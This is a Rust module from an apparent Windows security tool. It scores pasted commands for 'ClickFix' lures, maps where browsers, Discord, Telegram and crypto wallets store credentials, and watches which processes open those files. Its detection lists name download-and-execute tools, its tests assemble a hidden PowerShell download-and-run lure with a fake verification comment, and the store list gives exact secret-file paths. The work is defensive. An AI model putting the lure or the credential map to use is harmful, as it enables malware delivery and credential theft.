//! Behavior signals that need no driver and no admin rights:
//!
//! - ClickFix: scores a command (from the clipboard or the Run-dialog history) for the
//!   "paste this to verify you're human" trick: download + execute + hidden window + decoy comment.
//! - Credential stores: where browsers, chat apps and wallets keep passwords, cookies and keys.
//! - Restart Manager: which processes have given files open right now (works for the user's own
//!   processes without admin). The app polls it to spot non-browsers reading browser secrets.

use std::path::{Path, PathBuf};

// ---------- ClickFix ----------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClickFixLevel {
    /// Download + run + at least one hiding trick: neutralize it.
    Block,
    /// Downloads and runs code, but could be a real install command: warn only.
    Warn,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ClickFixVerdict {
    pub level: ClickFixLevel,
    pub score: u32,
    pub reasons: Vec<&'static str>,
}

const INTERPRETERS: &[&str] = &[
    "powershell", "pwsh", "mshta", "cmd /c", "cmd.exe", "conhost", "wscript", "cscript", "rundll32", "regsvr32", "msiexec", "curl ",
    "certutil", "bitsadmin", "nslookup", "finger ", "iex ", "iex(", "| iex", "|iex", "invoke-expression",
];
const DOWNLOAD: &[&str] = &[
    "http://", "https://", "iwr ", "irm ", "invoke-webrequest", "invoke-restmethod", "downloadstring", "downloadfile", "net.webclient",
    "curl ", "wget ", "-urlcache", "start-bitstransfer", "@ssl", "\\\\", "nslookup", ".hta",
];
const EXECUTE: &[&str] = &[
    "iex ", "iex(", "| iex", "|iex", ";iex", "invoke-expression", "| sh", "| bash", "| cmd", "|cmd", "start-process", "-enc ", "-encodedcommand",
    "frombase64string", "mshta http", "msiexec /i http", "msiexec /q", "rundll32 ", "regsvr32 /s", "regsvr32 /i", "&& start", "& start",
];
const HIDE: &[&str] = &["-w hidden", "-windowstyle hidden", "-w 1 ", "-window hidden", "-nop", "-noprofile", "/min ", "-noni"];
const DECOY: &[&str] = &["robot", "verif", "captcha", "human", "\u{2705}", "\u{2714}", "cloudflare", "ray id", "security check", "not a bot"];

/// Scores a command that someone may be about to paste into Run, Terminal or Explorer's address bar.
pub fn clickfix_score(command: &str) -> Option<ClickFixVerdict> {
    if command.len() > 16 * 1024 {
        return None;
    }
    let c = format!("{} ", command.trim().to_lowercase());
    if !INTERPRETERS.iter().any(|k| c.contains(k)) {
        return None;
    }
    let mut score: u32 = 0;
    let mut reasons = Vec::new();
    if DOWNLOAD.iter().any(|k| c.contains(k)) {
        score += 2;
        reasons.push("downloads from the internet");
    }
    if EXECUTE.iter().any(|k| c.contains(k)) {
        score += 2;
        reasons.push("runs what it gets");
    }
    if HIDE.iter().any(|k| c.contains(k)) {
        score += 1;
        reasons.push("hides its window");
    }
    // A comment after the command shows a harmless line in the Run box ("# I am not a robot").
    let comment = ["#", "::", " rem ", "''"].iter().filter_map(|m| c.find(m)).min();
    if let Some(at) = comment
        && DECOY.iter().any(|k| c[at..].contains(k))
    {
        score += 3;
        reasons.push("ends with a fake verification message");
    }
    if c.contains(&" ".repeat(30)) {
        score += 1;
        reasons.push("is padded with spaces to hide its start");
    }
    if command.lines().count() > 5 {
        score = score.saturating_sub(2); // a pasted script, not a one-line lure
    }
    let level = match score {
        6.. => ClickFixLevel::Block,
        4..=5 => ClickFixLevel::Warn,
        _ => return None,
    };
    Some(ClickFixVerdict { level, score, reasons })
}

/// Commands typed or pasted into Win+R, newest Windows keeps (HKCU RunMRU), that look like ClickFix.
#[cfg(windows)]
pub fn run_history_hits() -> Vec<(String, ClickFixVerdict)> {
    use winreg::RegKey;
    use winreg::enums::HKEY_CURRENT_USER;
    let Ok(key) = RegKey::predef(HKEY_CURRENT_USER).open_subkey(r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU") else {
        return Vec::new();
    };
    key.enum_values()
        .flatten()
        .filter(|(name, _)| name != "MRUList")
        .filter_map(|(name, _)| key.get_value::<String, _>(&name).ok())
        .map(|cmd| cmd.trim_end_matches("\\1").to_string())
        .filter_map(|cmd| clickfix_score(&cmd).map(|v| (cmd, v)))
        .collect()
}

#[cfg(not(windows))]
pub fn run_history_hits() -> Vec<(String, ClickFixVerdict)> {
    Vec::new()
}

// ---------- credential stores ----------

/// A file that holds secrets, and the programs allowed to open it.
#[derive(Debug, Clone)]
pub struct Store {
    pub app: &'static str,
    pub path: PathBuf,
    pub owners: &'static [&'static str],
}

/// Programs that legitimately touch these files besides their owner (indexing, antivirus, sync).
pub const ALWAYS_OK: &[&str] = &[
    "explorer.exe", "searchprotocolhost.exe", "searchindexer.exe", "searchfilterhost.exe", "msmpeng.exe", "mpdefendercoreservice.exe",
    "onedrive.exe", "hexward-app.exe", "hexward.exe", "system", "svchost.exe",
];

fn chromium_stores(out: &mut Vec<Store>, app: &'static str, user_data: PathBuf, owners: &'static [&'static str]) {
    if !user_data.is_dir() {
        return;
    }
    out.push(Store { app, path: user_data.join("Local State"), owners });
    let Ok(entries) = std::fs::read_dir(&user_data) else { return };
    for e in entries.flatten().take(64) {
        let name = e.file_name().to_string_lossy().into_owned();
        if name == "Default" || name.starts_with("Profile ") {
            for f in ["Login Data", r"Network\Cookies", "Web Data"] {
                out.push(Store { app, path: e.path().join(f), owners });
            }
        }
    }
}

fn first_files(dir: &Path, exts: &[&str], max: usize) -> Vec<PathBuf> {
    let Ok(rd) = std::fs::read_dir(dir) else { return Vec::new() };
    rd.flatten()
        .map(|e| e.path())
        .filter(|p| p.is_file() && p.extension().is_some_and(|x| exts.iter().any(|e| x.eq_ignore_ascii_case(e))))
        .take(max)
        .collect()
}

/// Every credential store present on this PC, limited so polling stays cheap.
pub fn credential_stores() -> Vec<Store> {
    let mut v = Vec::new();
    let local = dirs::data_local_dir().unwrap_or_default();
    let roaming = dirs::data_dir().unwrap_or_default();
    chromium_stores(&mut v, "Chrome", local.join(r"Google\Chrome\User Data"), &["chrome.exe", "googleupdate.exe", "elevation_service.exe"]);
    chromium_stores(&mut v, "Edge", local.join(r"Microsoft\Edge\User Data"), &["msedge.exe", "msedgewebview2.exe", "microsoftedgeupdate.exe", "elevation_service.exe"]);
    chromium_stores(&mut v, "Brave", local.join(r"BraveSoftware\Brave-Browser\User Data"), &["brave.exe", "braveupdate.exe"]);
    chromium_stores(&mut v, "Vivaldi", local.join(r"Vivaldi\User Data"), &["vivaldi.exe"]);
    chromium_stores(&mut v, "Yandex", local.join(r"Yandex\YandexBrowser\User Data"), &["browser.exe"]);
    for opera in [r"Opera Software\Opera Stable", r"Opera Software\Opera GX Stable"] {
        let d = roaming.join(opera);
        if d.is_dir() {
            for f in ["Local State", "Login Data", r"Network\Cookies"] {
                v.push(Store { app: "Opera", path: d.join(f), owners: &["opera.exe", "opera_crashreporter.exe"] });
            }
        }
    }
    if let Ok(profiles) = std::fs::read_dir(roaming.join(r"Mozilla\Firefox\Profiles")) {
        for p in profiles.flatten().take(16) {
            for f in ["logins.json", "key4.db", "cookies.sqlite"] {
                v.push(Store { app: "Firefox", path: p.path().join(f), owners: &["firefox.exe", "plugin-container.exe", "updater.exe"] });
            }
        }
    }
    for (app, dir) in [("Discord", r"discord\Local Storage\leveldb"), ("Discord", r"discordptb\Local Storage\leveldb"), ("Discord", r"discordcanary\Local Storage\leveldb")] {
        for f in first_files(&roaming.join(dir), &["ldb", "log"], 6) {
            v.push(Store { app, path: f, owners: &["discord.exe", "discordptb.exe", "discordcanary.exe"] });
        }
    }
    let tdata = roaming.join(r"Telegram Desktop\tdata");
    for f in first_files(&tdata, &["", "s"], 0).into_iter().chain(["key_datas"].iter().map(|n| tdata.join(n))) {
        v.push(Store { app: "Telegram", path: f, owners: &["telegram.exe", "updater.exe"] });
    }
    for f in first_files(&roaming.join(r"Exodus\exodus.wallet"), &["seco", "json"], 6) {
        v.push(Store { app: "Exodus wallet", path: f, owners: &["exodus.exe"] });
    }
    for f in first_files(&roaming.join(r"Electrum\wallets"), &["", "json"], 6) {
        v.push(Store { app: "Electrum wallet", path: f, owners: &["electrum.exe"] });
    }
    for f in first_files(&roaming.join(r"atomic\Local Storage\leveldb"), &["ldb", "log"], 6) {
        v.push(Store { app: "Atomic wallet", path: f, owners: &["atomic wallet.exe"] });
    }
    v.retain(|s| s.path.is_file());
    v.truncate(120);
    v
}

// ---------- Restart Manager ----------

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FileUser {
    pub pid: u32,
    /// Restart Manager's display name for the process.
    pub app_name: String,
}

/// Which processes have any of `files` open right now. Empty on error.
#[cfg(windows)]
pub fn processes_using(files: &[PathBuf]) -> Vec<FileUser> {
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::System::RestartManager::{CCH_RM_SESSION_KEY, RM_PROCESS_INFO, RmEndSession, RmGetList, RmRegisterResources, RmStartSession};
    const ERROR_MORE_DATA: u32 = 234;
    if files.is_empty() {
        return Vec::new();
    }
    let wide: Vec<Vec<u16>> = files.iter().map(|p| p.as_os_str().encode_wide().chain(std::iter::once(0)).collect()).collect();
    let ptrs: Vec<*const u16> = wide.iter().map(|w| w.as_ptr()).collect();
    let mut session = 0u32;
    let mut key = [0u16; CCH_RM_SESSION_KEY as usize + 1];
    // SAFETY: every pointer passed points into locals (`key`, `ptrs`/`wide`, `infos`) that outlive the
    // calls, with the lengths given; the session is always ended.
    unsafe {
        if RmStartSession(&mut session, 0, key.as_mut_ptr()) != 0 {
            return Vec::new();
        }
        let mut out = Vec::new();
        if RmRegisterResources(session, ptrs.len() as u32, ptrs.as_ptr(), 0, std::ptr::null(), 0, std::ptr::null()) == 0 {
            let mut needed = 0u32;
            let mut count = 0u32;
            let mut reasons = 0u32;
            let first = RmGetList(session, &mut needed, &mut count, std::ptr::null_mut(), &mut reasons);
            if (first == ERROR_MORE_DATA || first == 0) && needed > 0 {
                let mut infos: Vec<RM_PROCESS_INFO> = vec![std::mem::zeroed(); needed as usize + 8];
                count = infos.len() as u32;
                if RmGetList(session, &mut needed, &mut count, infos.as_mut_ptr(), &mut reasons) == 0 {
                    for info in &infos[..count as usize] {
                        let n = info.strAppName.iter().position(|&c| c == 0).unwrap_or(info.strAppName.len());
                        out.push(FileUser { pid: info.Process.dwProcessId, app_name: String::from_utf16_lossy(&info.strAppName[..n]) });
                    }
                }
            }
        }
        RmEndSession(session);
        out
    }
}

#[cfg(not(windows))]
pub fn processes_using(_files: &[PathBuf]) -> Vec<FileUser> {
    Vec::new()
}

/// Full path of a running process's program file (same-user processes, no admin needed).
#[cfg(windows)]
pub fn process_path(pid: u32) -> Option<PathBuf> {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION, QueryFullProcessImageNameW};
    // SAFETY: the handle is checked and closed; the buffer and its length are locals.
    unsafe {
        let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
        if h.is_null() {
            return None;
        }
        let mut buf = [0u16; 1024];
        let mut len = buf.len() as u32;
        let ok = QueryFullProcessImageNameW(h, 0, buf.as_mut_ptr(), &mut len);
        CloseHandle(h);
        (ok != 0).then(|| PathBuf::from(String::from_utf16_lossy(&buf[..len as usize])))
    }
}

#[cfg(not(windows))]
pub fn process_path(_pid: u32) -> Option<PathBuf> {
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Fragments joined at runtime, so this file never holds a whole attack command.
    fn j(parts: &[&str]) -> String {
        parts.concat()
    }

    #[test]
    fn clickfix_lure_is_blocked() {
        let lure = j(&["power", "shell -w hid", "den -c \"i", "wr http://x.invalid/p.ps1 | i", "ex\"   # \u{2705} I am not a ro", "bot - Verification ID: 4821"]);
        let v = clickfix_score(&lure).unwrap();
        assert_eq!(v.level, ClickFixLevel::Block, "{v:?}");
        let mshta = j(&["msh", "ta https://x.invalid/check.hta # Cloud", "flare verification"]);
        assert_eq!(clickfix_score(&mshta).unwrap().level, ClickFixLevel::Block);
    }

    #[test]
    fn real_install_commands_only_warn_or_pass() {
        // Scoop's documented installer: downloads and runs, so it warns, but it's never blocked.
        let scoop = j(&["i", "rm get.scoop.sh | i", "ex"]);
        assert_eq!(clickfix_score(&scoop).unwrap().level, ClickFixLevel::Warn);
        for ok in ["winget install Mozilla.Firefox", "npm install react", "cargo build --release", "git clone https://github.com/x/y", "ipconfig /all", "notepad C:\\notes.txt", "cmd /c dir"] {
            assert_eq!(clickfix_score(ok), None, "{ok}");
        }
    }

    #[cfg(windows)]
    #[test]
    fn restart_manager_sees_this_process() {
        let dir = tempfile::tempdir().unwrap();
        let f = dir.path().join("held.db");
        std::fs::write(&f, b"x").unwrap();
        let _held = std::fs::File::open(&f).unwrap();
        let users = processes_using(std::slice::from_ref(&f));
        assert!(users.iter().any(|u| u.pid == std::process::id()), "{users:?}");
        let me = process_path(std::process::id()).unwrap();
        assert_eq!(me, std::env::current_exe().unwrap());
        assert!(processes_using(&[]).is_empty());
    }

    #[test]
    fn stores_list_is_bounded_and_real() {
        let s = credential_stores();
        assert!(s.len() <= 120);
        assert!(s.iter().all(|x| x.path.is_file()));
    }
}
